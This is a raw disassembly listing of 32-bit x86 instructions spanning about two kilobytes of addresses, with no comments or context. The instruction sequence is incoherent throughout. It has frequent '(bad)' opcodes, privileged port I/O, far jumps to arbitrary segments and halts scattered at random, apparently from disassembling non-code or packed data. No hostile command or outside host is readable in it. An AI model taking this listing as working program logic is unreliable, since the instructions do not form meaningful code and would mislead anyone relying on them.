  405758:	xchg   dl,ch
  40575a:	repz and ah,dl
  40575d:	xor    BYTE PTR [esi-0x23],0x5a
  405761:	push   ds
  405762:	add    eax,0x16eb36c7
  405767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405768:	sbb    ebp,DWORD PTR [edi]
  40576a:	iret   
  40576b:	cli    
  40576c:	pop    ebp
  40576d:	add    edx,0x581a3278
  405773:	mov    eax,ds:0xa6b38226
  405778:	daa    
  405779:	out    0x39,eax
  40577b:	loope  0x405743
  40577d:	push   edi
  40577e:	popf   
  40577f:	gs push esi
  405781:	lods   al,BYTE PTR ds:[esi]
  405782:	test   BYTE PTR [edx+0x5b],dh
  405785:	add    al,0x0
  405787:	inc    edx
  405788:	xor    edx,DWORD PTR [edi+0x30]
  40578b:	lahf   
  40578c:	jmp    0x4c4b:0x921a252
  405793:	xor    ebx,0x62d8e58a
  405799:	mov    WORD PTR [esi],ds
  40579b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579c:	push   es
  40579d:	rol    DWORD PTR [eax-0x1b],cl
  4057a0:	pop    eax
  4057a1:	loopne 0x4057ac
  4057a3:	stos   BYTE PTR es:[edi],al
  4057a4:	test   eax,0x712a10c8
  4057a9:	lea    edx,[esp+edx*1]
  4057ac:	and    DWORD PTR [edi-0x7e],ebx
  4057af:	(bad)  
  4057b0:	cmc    
  4057b1:	adc    al,0x30
  4057b3:	pop    ss
  4057b4:	or     al,BYTE PTR ss:[ebx]
  4057b7:	sub    bl,BYTE PTR [edi+ecx*2-0x3d800f41]
  4057be:	in     al,0xaf
  4057c0:	or     eax,0xa5c0be08
  4057c5:	mov    dl,0xab
  4057c7:	sbb    ch,BYTE PTR [eax+0xf]
  4057ca:	push   0xffffffee
  4057cc:	popf   
  4057cd:	(bad)  
  4057ce:	int    0x3f
  4057d0:	sub    bh,bl
  4057d2:	xor    al,0x4b
  4057d4:	jl     0x4057bb
  4057d6:	dec    esi
  4057d7:	mov    esi,0xed58f241
  4057dc:	sbb    al,0x1
  4057de:	inc    ebp
  4057df:	ror    esp,1
  4057e1:	dec    ebp
  4057e2:	jns    0x405848
  4057e4:	sub    BYTE PTR [ebp+0x57411060],dh
  4057ea:	repnz mov bh,0xe0
  4057ed:	loop   0x4057d4
  4057ef:	mov    al,0x55
  4057f1:	cwde   
  4057f2:	xor    eax,0x254beea5
  4057f7:	sbb    eax,DWORD PTR [ebp+0x54]
  4057fa:	jnp    0x405823
  4057fc:	xor    DWORD PTR [edi-0x28],esp
  4057ff:	retf   0x11e7
  405802:	xor    BYTE PTR [ebx+edx*4],cl
  405805:	inc    edx
  405806:	loopne 0x405791
  405808:	mov    esi,0xfac114db
  40580d:	bound  ecx,QWORD PTR [ebx+0x45]
  405810:	loop   0x405838
  405812:	and    eax,0x555c623f
  405817:	xchg   esp,eax
  405818:	aas    
  405819:	lahf   
  40581a:	lock inc edx
  40581c:	dec    esp
  40581d:	sbb    dl,dl
  40581f:	scas   al,BYTE PTR es:[edi]
  405820:	std    
  405821:	xchg   DWORD PTR [edx],edx
  405823:	scas   eax,DWORD PTR es:[edi]
  405824:	xchg   ebx,eax
  405825:	and    ebx,edx
  405827:	push   DWORD PTR [eax+ebx*8]
  40582a:	jae    0x405842
  40582c:	and    ah,cl
  40582e:	add    BYTE PTR [eax-0x7a],cl
  405831:	out    0x22,al
  405833:	adc    ah,BYTE PTR [ecx-0x14d21e77]
  405839:	mov    eax,0xa6d3336b
  40583e:	xchg   esp,eax
  40583f:	mov    ah,0xeb
  405841:	sub    ebp,ebp
  405843:	rol    BYTE PTR [ebx],cl
  405845:	fld    DWORD PTR [esi+0x59]
  405848:	cld    
  405849:	iret   
  40584a:	int3   
  40584b:	inc    ebx
  40584c:	outs   dx,BYTE PTR ds:[esi]
  40584d:	das    
  40584e:	jbe    0x4057f9
  405850:	xor    DWORD PTR [ecx-0x4b2b64c5],ebx
  405856:	int    0x35
  405858:	ret    
  405859:	shl    esi,cl
  40585b:	ds out 0x81,eax
  40585e:	adc    esi,esp
  405860:	mov    esi,0x5248a6fb
  405865:	jg     0x4058db
  405867:	add    ebx,DWORD PTR [edx-0xa]
  40586a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40586b:	push   cs
  40586c:	sbb    bh,BYTE PTR [edx+0x9491a09]
  405872:	mov    fs,WORD PTR ds:0x12906ac3
  405878:	out    dx,eax
  405879:	dec    esp
  40587a:	les    esi,FWORD PTR [eax+ebx*8]
  40587d:	mov    ah,0x42
  40587f:	jnp    0x40582c
  405881:	xchg   ebx,eax
  405882:	mov    eax,0xce656ed2
  405887:	pusha  
  405888:	ins    DWORD PTR es:[edi],dx
  405889:	fcom   st(5)
  40588b:	mul    ebx
  40588d:	and    DWORD PTR [edx-0x63d78900],edx
  405893:	pop    ss
  405894:	pop    ebp
  405895:	jno    0x4058a0
  405897:	in     al,dx
  405898:	jge    0x4058ef
  40589a:	call   0xb34c:0x61b80024
  4058a1:	imul   BYTE PTR [esi-0x5664dd3c]
  4058a7:	scas   al,BYTE PTR es:[edi]
  4058a8:	push   ecx
  4058a9:	sbb    DWORD PTR [eax+esi*2+0x76],0x504e0c69
  4058b1:	test   DWORD PTR [esi],esp
  4058b3:	rcr    DWORD PTR [ebp-0x3d0bd65f],0xc9
  4058ba:	mov    dh,0x22
  4058bc:	pop    esi
  4058bd:	and    ebx,0xffffffee
  4058c0:	jmp    0x14a1:0x11ae63e0
  4058c7:	push   ss
  4058c8:	push   0xffffffb1
  4058ca:	cmp    DWORD PTR [edi],0xe663e982
  4058d0:	rol    DWORD PTR [esi-0x30],cl
  4058d3:	xchg   ebx,eax
  4058d4:	add    al,0xd
  4058d6:	adc    al,0x91
  4058d9:	mov    dl,0x46
  4058db:	pop    ebx
  4058dc:	leave  
  4058dd:	cmp    DWORD PTR [ecx*8+0x4ea963f8],ebx
  4058e4:	enter  0xdc76,0x2c
  4058e8:	xchg   ebx,eax
  4058e9:	or     DWORD PTR [edx],edi
  4058eb:	pop    esi
  4058ec:	add    esi,0xffffffca
  4058ef:	sbb    DWORD PTR [ebx],esi
  4058f1:	add    BYTE PTR [ecx],0x6a
  4058f4:	lds    edx,FWORD PTR [edx]
  4058f6:	nop
  4058f7:	jmp    0x4058c8
  4058f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058fa:	jmp    0xdfecf609
  4058ff:	mov    cl,0xd8
  405901:	mov    ds:0x99bce7dc,eax
  405906:	inc    ebx
  405907:	leave  
  405908:	mov    ch,0xb5
  40590a:	hlt    
  40590b:	fidivr DWORD PTR [edx]
  40590d:	push   esi
  40590e:	nop
  40590f:	push   ds
  405910:	or     eax,0x9b81f545
  405915:	dec    eax
  405916:	fisttp DWORD PTR [eax-0xbe93bee]
  40591c:	xor    al,0xc
  40591e:	div    BYTE PTR [esi+0x227fad6f]
  405924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405925:	push   0xffffffb1
  405927:	jne    0x4058ce
  405929:	dec    edi
  40592a:	jo     0x405948
  40592c:	jo     0x4058d3
  40592e:	inc    ebx
  40592f:	rcr    BYTE PTR [ebp-0x3a],1
  405932:	adc    eax,edi
  405934:	jmp    0x6483:0x390d1f51
  40593b:	push   ebx
  40593c:	mov    ds:0x33b6a9b8,al
  405941:	ror    DWORD PTR [eax-0x595434c8],cl
  405947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405948:	push   es
  405949:	jecxz  0x4059b7
  40594b:	fcom   DWORD PTR [ebp-0x2528cf44]
  405951:	fistp  WORD PTR ds:0xaa3c2f21
  405957:	mov    ds:0xb3ad72bf,eax
  40595c:	inc    ebp
  40595d:	sahf   
  40595e:	and    BYTE PTR [ecx+0x4e301e43],al
  405964:	(bad)  
  405965:	pop    edi
  405966:	mov    bl,0x4b
  405968:	lock aaa 
  40596a:	or     DWORD PTR [ecx],esp
  40596c:	pushf  
  40596d:	jno    0x4059ee
  40596f:	ja     0x405980
  405971:	sub    esp,edx
  405973:	inc    esp
  405974:	cli    
  405975:	lock or ch,BYTE PTR [eax-0x4d]
  405979:	sub    bl,BYTE PTR [esi+0x28]
  40597c:	jle    0x4059cb
  40597e:	mov    al,0x50
  405980:	adc    DWORD PTR [eax],edx
  405982:	jecxz  0x405944
  405984:	jle    0x40598a
  405986:	jne    0x405936
  405988:	add    BYTE PTR [eax-0x16c8dd94],0x6
  40598f:	xchg   DWORD PTR [esi+0xe],esp
  405992:	cmp    bh,BYTE PTR [ebx-0x63]
  405995:	lahf   
  405996:	push   esp
  405997:	adc    BYTE PTR [eax],0x53
  40599a:	mov    ds:0x16e14191,eax
  40599f:	mov    dl,0x96
  4059a1:	dec    esp
  4059a2:	xchg   ch,ch
  4059a4:	inc    esp
  4059a5:	test   eax,0x14304db
  4059aa:	mov    cs,WORD PTR ds:0xfb04e19
  4059b0:	pushf  
  4059b1:	shr    DWORD PTR [eax-0x342d55c0],cl
  4059b7:	aas    
  4059b8:	cmp    DWORD PTR ds:0xcb96598b,ecx
  4059be:	call   0xa781e2b1
  4059c3:	pop    eax
  4059c4:	dec    ebx
  4059c5:	adc    edx,DWORD PTR [esi-0x300d3411]
  4059cb:	push   ebp
  4059cc:	inc    ecx
  4059cd:	scas   eax,DWORD PTR es:[edi]
  4059ce:	fidivr WORD PTR [eax]
  4059d0:	mov    esi,0xe43fe988
  4059d5:	jle    0x405960
  4059d7:	and    BYTE PTR [esi],al
  4059d9:	popa   
  4059da:	sub    DWORD PTR gs:[edx-0x7e3933c9],edi
  4059e1:	ror    ebx,cl
  4059e3:	jo     0x4059c5
  4059e5:	das    
  4059e6:	adc    eax,0x2d708ef2
  4059eb:	push   ecx
  4059ec:	imul   esi,DWORD PTR [ecx+0x7d],0x7
  4059f0:	cwde   
  4059f1:	xlat   BYTE PTR ds:[ebx]
  4059f2:	and    DWORD PTR [edx+0x611e51b9],esi
  4059f8:	and    al,0x9c
  4059fa:	test   BYTE PTR [ebx-0x4d],dh
  4059fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059fe:	sub    bh,ch
  405a00:	das    
  405a01:	test   DWORD PTR [ebx],edx
  405a03:	test   BYTE PTR [ebp+0x49156c44],ch
  405a09:	cmc    
  405a0a:	stos   DWORD PTR es:[edi],eax
  405a0b:	dec    ecx
  405a0c:	std    
  405a0d:	dec    eax
  405a0e:	rcr    DWORD PTR [eax+eax*2-0x41],cl
  405a12:	ror    eax,0xb3
  405a15:	mov    ecx,0x52d90341
  405a1a:	and    BYTE PTR [ebx],ah
  405a1c:	les    ebx,FWORD PTR [ecx+0x7d]
  405a1f:	xchg   DWORD PTR [ecx],esp
  405a21:	xchg   esp,eax
  405a22:	adc    eax,0x524d8536
  405a27:	and    bh,BYTE PTR [ebp-0x3b]
  405a2a:	pop    ebp
  405a2b:	loopne 0x405a92
  405a2d:	pop    esi
  405a2e:	mov    ch,0xc
  405a30:	mov    ecx,0x16131f64
  405a35:	ret    0x6779
  405a38:	mov    DWORD PTR [edi],edi
  405a3a:	(bad)  
  405a3c:	icebp  
  405a3d:	mov    dh,0xe3
  405a3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a40:	mov    ah,0xd2
  405a42:	add    al,0x96
  405a44:	(bad)  
  405a45:	mov    ds:0xdd64da33,al
  405a4a:	iret   
  405a4b:	pop    esi
  405a4c:	jl     0x405abe
  405a4e:	push   0x4dc201b6
  405a53:	ja     0x405a3c
  405a55:	cmovle eax,DWORD PTR [ecx+ebx*8]
  405a59:	out    0xb7,al
  405a5b:	mov    ecx,0x279ceb00
  405a60:	cmp    al,bh
  405a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a63:	shl    BYTE PTR [eax-0x40],1
  405a66:	xchg   esi,eax
  405a67:	pop    edx
  405a68:	and    edi,DWORD PTR [esi-0xe]
  405a6b:	inc    edx
  405a6c:	sbb    esp,edi
  405a6e:	adc    BYTE PTR [eax],bl
  405a70:	sub    ebx,edi
  405a72:	imul   ebp,ebx,0x272a5348
  405a78:	add    BYTE PTR [edi+0x27b4b256],ah
  405a7e:	inc    esp
  405a7f:	pop    eax
  405a80:	jg     0x405a86
  405a82:	std    
  405a83:	cmc    
  405a84:	mov    ds:0xba635431,al
  405a89:	sub    bl,cl
  405a8b:	mov    ecx,0x7f091c8c
  405a90:	fwait
  405a91:	xor    eax,esi
  405a93:	xchg   ecx,eax
  405a94:	mov    dl,0x3a
  405a96:	repz jg 0x405a99
  405a99:	mov    al,0x96
  405a9b:	mov    ch,0xa9
  405a9d:	in     al,0x90
  405a9f:	lods   eax,DWORD PTR ds:[esi]
  405aa0:	xchg   edi,eax
  405aa1:	std    
  405aa2:	in     eax,0x17
  405aa4:	mov    ds:0x46712baf,eax
  405aa9:	inc    eax
  405aaa:	mov    ebx,0xfdc8e3d
  405aaf:	mov    dh,0x44
  405ab1:	adc    cl,dh
  405ab3:	jl     0x405aaf
  405ab5:	fst    st(5)
  405ab7:	inc    ebx
  405ab8:	add    eax,0x6d11085d
  405abd:	cmp    eax,0xcc20daf2
  405ac2:	adc    dh,BYTE PTR [eax-0x5a]
  405ac5:	dec    ebp
  405ac6:	inc    ebp
  405ac7:	inc    edi
  405ac8:	les    esi,FWORD PTR [eax-0x41ed93b5]
  405ace:	sub    ebx,edx
  405ad0:	mov    ch,0x40
  405ad2:	iret   
  405ad3:	sub    eax,0xc4fb5dee
  405ad8:	loopne 0x405b07
  405ada:	and    edx,DWORD PTR [esi]
  405adc:	dec    ebx
  405add:	xor    eax,edx
  405adf:	lods   al,BYTE PTR ds:[esi]
  405ae0:	sbb    BYTE PTR [ecx-0x2a959fb2],cl
  405ae6:	imul   ecx,DWORD PTR ds:0x9bcba403,0x47
  405aed:	int3   
  405aee:	scas   eax,DWORD PTR es:[edi]
  405aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405af0:	sub    eax,0xe08ab525
  405af5:	int3   
  405af6:	call   0x360a93b9
  405afb:	jmp    0x2a8a:0x5800803c
  405b02:	or     ch,0x3e
  405b05:	mov    cl,0x9c
  405b07:	bound  edx,QWORD PTR [ebx-0x7cdb7e4e]
  405b0d:	fild   WORD PTR [ebx+0x609ec228]
  405b13:	dec    ebp
  405b14:	xchg   esp,eax
  405b15:	fwait
  405b16:	xor    eax,0xbf8dac45
  405b1b:	push   edi
  405b1c:	imul   edx,eax,0xc3cf8c41
  405b22:	sahf   
  405b23:	(bad)  
  405b24:	push   es
  405b25:	pushf  
  405b26:	sbb    eax,0x33c1d5c
  405b2b:	push   0xcdee5c39
  405b30:	jle    0x405b10
  405b32:	cmp    ecx,DWORD PTR [ecx]
  405b34:	lahf   
  405b35:	js     0x405b6e
  405b37:	ja     0x405b1c
  405b39:	cmp    eax,0x9f030969
  405b3e:	jnp    0x405af1
  405b40:	pusha  
  405b41:	lods   al,BYTE PTR ds:[esi]
  405b42:	ins    DWORD PTR es:[edi],dx
  405b43:	mov    WORD PTR [edi+0x1b],fs
  405b46:	cmp    ah,ah
  405b48:	mov    esp,esp
  405b4a:	in     al,0x74
  405b4c:	mov    ?,WORD PTR [ebx-0x710bf7b8]
  405b52:	mov    eax,0xbf579ed
  405b57:	jge    0x405b6a
  405b59:	(bad)  
  405b5a:	pop    esi
  405b5b:	iret   
  405b5c:	inc    ebp
  405b5d:	mov    ?,WORD PTR [edi]
  405b5f:	arpl   cx,ax
  405b61:	pop    esi
  405b62:	cwde   
  405b63:	dec    ebp
  405b64:	sub    al,0x69
  405b66:	inc    ecx
  405b67:	sbb    eax,0x605a4b9b
  405b6c:	test   DWORD PTR [edx],edi
  405b6e:	push   ss
  405b6f:	sbb    DWORD PTR [ecx],0x9916f73e
  405b75:	mov    WORD PTR [ebp+0x78],gs
  405b78:	int3   
  405b79:	mov    bl,0x1
  405b7b:	mov    edi,ebx
  405b7d:	mov    edi,0xf8c91c93
  405b82:	mov    ebx,0xa2ba0e9a
  405b87:	inc    edi
  405b88:	leave  
  405b89:	repz fnsave [ebx]
  405b8c:	pop    ebp
  405b8d:	cs pop edx
  405b8f:	ret    0x4b73
  405b92:	fbstp  TBYTE PTR [ecx-0x10]
  405b95:	cmp    al,0xfb
  405b97:	repnz push sp
  405b9a:	retf   
  405b9b:	sub    eax,0x32a72b11
  405ba0:	pop    es
  405ba1:	pop    ss
  405ba2:	mov    ecx,0x5df659c5
  405ba7:	jmp    0x405b7b
  405ba9:	dec    ebx
  405baa:	dec    edx
  405bab:	sub    eax,0x43e5c963
  405bb0:	call   0x9f05a597
  405bb5:	daa    
  405bb6:	or     DWORD PTR [eax+0x1a8ec567],ebx
  405bbc:	hlt    
  405bbd:	jmp    0x405b59
  405bbf:	in     al,dx
  405bc0:	inc    eax
  405bc1:	(bad)  
  405bc2:	clc    
  405bc3:	mov    WORD PTR [esi-0xd4367e8],cs
  405bc9:	mov    ds:0x9e8354c1,al
  405bce:	retf   
  405bcf:	push   ecx
  405bd0:	push   0xaa2b51f1
  405bd5:	pop    ebp
  405bd6:	out    dx,al
  405bd7:	cmp    esi,DWORD PTR [edx-0x7ea3e847]
  405bdd:	aam    0x58
  405bdf:	xor    ah,BYTE PTR [ecx+edx*2]
  405be2:	push   es
  405be3:	leave  
  405be4:	out    dx,eax
  405be5:	push   0x6
  405be7:	js     0x405b9f
  405be9:	dec    esi
  405bea:	(bad)  
  405bec:	cld    
  405bed:	ins    BYTE PTR es:[edi],dx
  405bee:	adc    eax,0xd6bf534f
  405bf3:	xchg   edx,eax
  405bf4:	ret    0x166d
  405bf7:	lods   eax,DWORD PTR ds:[esi]
  405bf8:	xchg   ebp,eax
  405bf9:	cdq    
  405bfa:	(bad)  
  405bfb:	mov    DWORD PTR [esi+edi*1-0x50],esp
  405bff:	xchg   edi,eax
  405c00:	fsub   DWORD PTR [edx]
  405c02:	xchg   edx,eax
  405c03:	sahf   
  405c04:	inc    esp
  405c05:	sti    
  405c06:	inc    ebx
  405c07:	arpl   dx,si
  405c09:	cmc    
  405c0a:	lahf   
  405c0b:	ror    DWORD PTR [edx],0x19
  405c0e:	dec    ebx
  405c0f:	sbb    al,0xd7
  405c11:	clc    
  405c12:	push   edi
  405c13:	inc    edx
  405c14:	sub    dl,dh
  405c16:	xchg   ebx,eax
  405c17:	xchg   edi,eax
  405c18:	mov    eax,0x9e105476
  405c1d:	mov    WORD PTR [eax+esi*4],ss
  405c20:	ss pop ebx
  405c22:	imul   esi,DWORD PTR [eax+0x32],0x46
  405c26:	inc    edi
  405c27:	enter  0xae3d,0x85
  405c2b:	push   esi
  405c2c:	push   esi
  405c2d:	cmp    eax,0x5286daac
  405c32:	mov    WORD PTR [eax],gs
  405c34:	in     eax,0xb5
  405c36:	adc    dl,BYTE PTR cs:[edx]
  405c39:	cmp    edx,DWORD PTR [ebp-0x15]
  405c3c:	adc    cl,0xe8
  405c3f:	call   0xaa64:0x73e6c794
  405c46:	icebp  
  405c47:	or     DWORD PTR [edi+0x45cbc84c],ebx
  405c4d:	push   ds
  405c4e:	cmp    BYTE PTR [eax+ebx*4-0x24],cl
  405c52:	push   ebp
  405c53:	imul   ecx,DWORD PTR [ebp-0x7ff9bb6],0x23641269
  405c5d:	adc    eax,DWORD PTR [edx]
  405c5f:	ret    0x9b05
  405c62:	lods   al,BYTE PTR ds:[esi]
  405c63:	or     al,0x50
  405c65:	daa    
  405c66:	cmp    BYTE PTR [edx-0xfb1e02b],dh
  405c6c:	dec    edx
  405c6d:	dec    esi
  405c6e:	mov    eax,ds:0xbaf5ba4f
  405c73:	mov    al,ds:0x393e2de3
  405c78:	or     DWORD PTR [ecx-0x5a27f9de],0x8ab74ed8
  405c82:	dec    ecx
  405c83:	outs   dx,BYTE PTR ds:[esi]
  405c84:	outs   dx,BYTE PTR ds:[esi]
  405c85:	jge    0x405ce4
  405c87:	push   esi
  405c88:	call   0xcdae:0xe5a3a03c
  405c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c90:	iret   
  405c91:	in     ax,dx
  405c93:	and    eax,DWORD PTR [esi+0x7beddf4b]
  405c99:	push   es
  405c9a:	fs inc edx
  405c9c:	xor    eax,0x944ec063
  405ca1:	push   ecx
  405ca2:	lock lods al,BYTE PTR ds:[esi]
  405ca4:	out    0x20,al
  405ca6:	fimul  DWORD PTR [ebx+0x6d]
  405ca9:	stos   DWORD PTR es:[edi],eax
  405caa:	imul   esi,DWORD PTR [esi-0x19],0x1d
  405cae:	push   ss
  405caf:	or     al,0x9e
  405cb1:	pushf  
  405cb2:	jbe    0x405ca2
  405cb4:	mov    bl,0xf8
  405cb6:	sbb    bl,BYTE PTR [ebx]
  405cb8:	and    cl,ah
  405cba:	xor    DWORD PTR [edi-0x1e66bfe4],esp
  405cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cc1:	mov    es,ecx
  405cc3:	fnsave [ecx+0x3a]
  405cc6:	es in  al,dx
  405cc8:	mov    ds:0xd76c430f,eax
  405ccd:	push   edx
  405cce:	mov    bl,0xc1
  405cd0:	jmp    0x405d1d
  405cd2:	inc    esi
  405cd3:	xchg   edx,eax
  405cd4:	lds    ebx,FWORD PTR [esi+0x3d]
  405cd7:	rcr    DWORD PTR ds:0x6e99a56,cl
  405cdd:	sub    eax,0x35a00b94
  405ce2:	leave  
  405ce3:	xor    ebx,ecx
  405ce5:	or     BYTE PTR [eax+0x6a],cl
  405ce8:	push   ebx
  405ce9:	dec    ebp
  405cea:	hlt    
  405ceb:	daa    
  405cec:	iret   
  405ced:	push   cs
  405cee:	mov    DWORD PTR [esi+0x69],ecx
  405cf1:	lock cwde 
  405cf3:	sub    ebp,edi
  405cf5:	inc    edx
  405cf6:	fldcw  WORD PTR [ebx]
  405cf8:	xor    ch,cl
  405cfa:	fistp  WORD PTR [edx-0x78]
  405cfd:	and    DWORD PTR ds:[ebx-0x3e],ebp
  405d01:	sub    BYTE PTR [edx+0x20],ah
  405d04:	out    0xf0,eax
  405d06:	and    al,0x1a
  405d08:	out    dx,al
  405d09:	pop    ebx
  405d0a:	jnp    0x405d73
  405d0c:	or     ebp,esp
  405d0e:	cmp    BYTE PTR [esi-0xb399a1e],0x7c
  405d15:	outs   dx,BYTE PTR ds:[esi]
  405d16:	mov    esi,0x534654e3
  405d1b:	shr    DWORD PTR [edi-0x79],cl
  405d1e:	mov    bl,BYTE PTR [edx+0x7cb9c14d]
  405d24:	add    bl,BYTE PTR [eax+0x2f]
  405d27:	pop    ebp
  405d28:	mov    al,ds:0x2a3404b0
  405d2d:	leave  
  405d2e:	cs or  al,0xa2
  405d31:	cmp    eax,0xbb579891
  405d36:	(bad)  
  405d37:	jo     0x405cfe
  405d39:	dec    ebp
  405d3a:	nop
  405d3b:	retf   0x1b7e
  405d3e:	stos   BYTE PTR es:[edi],al
  405d3f:	mov    eax,ds:0x45f7a10f
  405d44:	push   0xc06f5de0
  405d49:	rol    BYTE PTR [eax],cl
  405d4b:	cld    
  405d4c:	xchg   ecx,eax
  405d4d:	iret   
  405d4e:	retf   
  405d4f:	mov    dl,0x6e
  405d51:	sbb    cl,BYTE PTR [edx-0x34]
  405d54:	xlat   BYTE PTR ds:[ebx]
  405d55:	in     al,dx
  405d56:	dec    esp
  405d57:	lea    esp,[ebx-0x5d]
  405d5a:	cli    
  405d5b:	push   0x1
  405d5d:	rol    DWORD PTR [eax+0x22],0xec
  405d61:	cmp    al,0x60
  405d63:	xor    al,0x56
  405d65:	xchg   ebx,eax
  405d66:	popf   
  405d67:	ss sub eax,0xef7b7f43
  405d6d:	lods   al,BYTE PTR ds:[esi]
  405d6e:	inc    ecx
  405d6f:	mov    ch,0x99
  405d71:	in     eax,0x23
  405d73:	paddusw mm7,QWORD PTR [eax]
  405d76:	mov    cl,bl
  405d78:	mov    esp,0x1a260d92
  405d7d:	or     DWORD PTR ds:0xb1d5fe91,0xffffffff
  405d84:	mov    bl,BYTE PTR [edx+0x30]
  405d87:	add    DWORD PTR [eax-0x26d3c66e],0xffffffdc
  405d8e:	imul   eax,ecx,0x33b353e4
  405d94:	jg     0x405da5
  405d96:	pop    eax
  405d97:	jmp    0xeaeccc97
  405d9c:	jne    0x405d44
  405d9e:	add    cl,dh
  405da0:	mov    ah,0xce
  405da2:	cmp    DWORD PTR [ecx+0x4814a5cb],edi
  405da8:	sub    edx,DWORD PTR [esi+0x73fd3586]
  405dae:	scas   eax,DWORD PTR es:[edi]
  405daf:	xchg   ebp,eax
  405db0:	sbb    ebx,esi
  405db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405db3:	aas    
  405db4:	xchg   BYTE PTR [esi-0x58],dl
  405db7:	sub    ebx,DWORD PTR [ecx]
  405db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dba:	xor    dh,BYTE PTR [ebp+0x1ff7d04e]
  405dc0:	jle    0x405d46
  405dc2:	jmp    0x405e25
  405dc4:	test   eax,ecx
  405dc6:	setl   BYTE PTR [edi-0x7e1d6bcc]
  405dcd:	jp     0x405d93
  405dcf:	in     al,0x7b
  405dd1:	int3   
  405dd2:	call   0x3576:0x153ce653
  405dd9:	test   al,0xb1
  405ddb:	sub    ebx,DWORD PTR [edi-0x36]
  405dde:	and    dl,ah
  405de0:	int    0x15
  405de2:	sub    al,0x36
  405de4:	pop    edi
  405de5:	xor    eax,0x22de69d2
  405dea:	cmp    al,0x2d
  405dec:	hlt    
  405ded:	loop   0x405ddc
  405def:	das    
  405df0:	mov    ss,ecx
  405df2:	mov    BYTE PTR [ebx+0x660390de],cl
  405df8:	clc    
  405df9:	inc    esi
  405dfa:	and    DWORD PTR [edx+0x1c919e96],0x564496b6
  405e04:	dec    ebp
  405e05:	pop    ecx
  405e06:	mov    edi,DWORD PTR [ebx]
  405e08:	into   
  405e09:	fnstsw WORD PTR [eax]
  405e0b:	pushf  
  405e0c:	nop
  405e0d:	push   ecx
  405e0e:	call   0x8c36:0x4f506556
  405e15:	mov    BYTE PTR [si-0x7bfd],dl
  405e1a:	je     0x405dde
  405e1c:	pop    ss
  405e1d:	or     BYTE PTR [edi],ah
  405e1f:	fs fcom st(6)
  405e22:	cmp    eax,0x168c186b
  405e27:	and    al,0x46
  405e29:	or     eax,0xfa23af4c
  405e2e:	xchg   esp,eax
  405e2f:	je     0x405e70
  405e31:	cld    
  405e32:	adc    BYTE PTR ds:0xbe88ebcb,ah
  405e38:	sbb    DWORD PTR [edx-0x18],ebx
  405e3b:	outs   dx,BYTE PTR ds:[esi]
  405e3c:	test   bl,ah
  405e3e:	rol    edi,cl
  405e40:	lahf   
  405e41:	aam    0x37
  405e43:	or     ecx,DWORD PTR [edi-0x6f]
  405e46:	test   DWORD PTR [ebp-0x47],0xe401d024
  405e4d:	xchg   cl,cl
  405e4f:	retf   0xe1c
  405e52:	shr    DWORD PTR [esi+0x11],0x4b
  405e56:	adc    DWORD PTR [esi-0x3aebcabf],edi
  405e5c:	xor    ebx,DWORD PTR ds:0xbfa05823
  405e62:	loope  0x405e32
  405e64:	mov    bl,0x47
  405e66:	xchg   DWORD PTR [ecx+ebx*2-0x15475214],ecx
  405e6d:	ins    BYTE PTR es:[edi],dx
  405e6e:	lods   al,BYTE PTR ds:[esi]
  405e6f:	push   edi
  405e70:	out    0xec,al
  405e72:	mov    al,0xdf
  405e74:	cmp    edi,ebp
  405e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e77:	push   edx
  405e79:	add    BYTE PTR [ecx+0x75f37178],bl
  405e7f:	inc    BYTE PTR [esi]
  405e81:	mov    ss,WORD PTR [ebx]
  405e83:	xor    BYTE PTR [eax],0x1d
  405e86:	sbb    al,0x6d
  405e88:	xchg   edi,eax
  405e89:	sbb    esp,DWORD PTR [esi-0x60]
  405e8c:	add    esp,ebx
  405e8e:	jge    0x405e70
  405e90:	and    dl,BYTE PTR [edx]
  405e92:	mov    ebx,0x4177c9c3
  405e97:	(bad)  
  405e99:	mov    bh,0x5b
  405e9b:	retf   
  405e9c:	aad    0x3a
  405e9e:	inc    ecx
  405e9f:	jbe    0x405edd
  405ea1:	push   ebx
  405ea2:	pop    ecx
  405ea3:	fnstcw WORD PTR [edi]
  405ea5:	(bad)  [esi+0x37]
  405ea8:	call   0x51b:0xa57c751
  405eaf:	cwde   
  405eb0:	inc    eax
  405eb1:	dec    ebx
  405eb2:	ror    DWORD PTR ds:0xd6c2d578,0x6c
  405eb9:	jns    0x405f1a
  405ebb:	xor    al,0xca
  405ebd:	or     DWORD PTR [ebp-0x2dafe89],0xcf1054ba
  405ec7:	ret    0xed9a
  405eca:	adc    al,cl
  405ecc:	les    ebx,FWORD PTR [ebp-0x11]
  405ecf:	dec    ebp
  405ed0:	int    0x9c
  405ed2:	int    0x2e
  405ed4:	scas   al,BYTE PTR es:[edi]
  405ed5:	mov    esi,0x8de33464
  405eda:	into   
  405edb:	ror    ebx,0x8b
  405ede:	fs xor eax,0xb05447d1
  405ee4:	pop    ecx
  405ee5:	sahf   
  405ee6:	adc    esi,esi
  405ee8:	fstp   DWORD PTR [esi]
  405eea:	call   0x94bb:0x8e8b4f
  405ef1:	div    DWORD PTR [edi+0x4b1c666a]
  405ef7:	nop
  405ef8:	xchg   esp,eax
  405ef9:	nop
  405efa:	aas    
  405efb:	test   DWORD PTR [eax-0x66],ebx
  405efe:	(bad)  
  405eff:	jns    0x405efc
  405f01:	pop    es
  405f02:	adc    BYTE PTR [edi],ah
  405f04:	test   al,0x8e
  405f06:	(bad)  
  405f07:	cli    
  405f08:	bound  edx,QWORD PTR [ebp+0x69]
  405f0b:	test   DWORD PTR [eax],ebp
  405f0d:	xchg   ebp,eax
  405f0e:	adc    BYTE PTR [ebx],bl
